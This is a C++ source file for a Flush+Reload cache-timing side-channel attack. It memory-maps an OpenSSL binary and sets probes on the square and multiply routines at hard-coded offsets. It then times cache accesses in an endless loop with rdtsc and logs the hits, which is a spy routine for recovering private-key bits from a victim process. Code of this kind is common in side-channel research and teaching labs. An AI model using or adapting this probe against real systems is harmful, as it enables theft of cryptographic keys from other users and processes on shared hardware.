#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include "./cacheutils.h"
#include <map>
#include <vector>
#include <bits/stdc++.h>
using namespace std;


// this number varies on different systems
#define MIN_CACHE_MISS_CYCLES (175)

char* base;
char* ending;

int main()
{

  cout.sync_with_stdio(false);
  int fd = open("./openssl", O_RDONLY);
  size_t size = lseek(fd, 0, SEEK_END);
  if (size == 0)
    exit(-1);
  size_t map_size = size;
  if ((map_size & 0xFFF) != 0)
  {
    map_size |= 0xFFF;
    map_size += 1;
  }
  cout<<map_size<<endl;
  base = (char*) mmap(NULL, map_size, PROT_READ, MAP_SHARED, fd, 0);
  ending = base + size;

  char* sqrProbe = base + 0x4d78c0;
  char* mulProbe = base + 0x4d7360;

  time_t my_t = time(NULL);
  int hit = 0;
  unsigned long long start = rdtsc();
  while(true)
  {
    unsigned long long current = rdtsc();
    if((current - start)%1024<10) {
      unsigned long delta1 = probe_timing(sqrProbe);
      if(delta1 < 100){
        printf("%llu,%d\n",rdtsc(),delta1);
      }
    }
  } 
  // printf("---------------\n");
  // printf("%d\n", hit);
  close(fd);
  munmap(base, map_size);
  fflush(stdout);
  return 0;
}

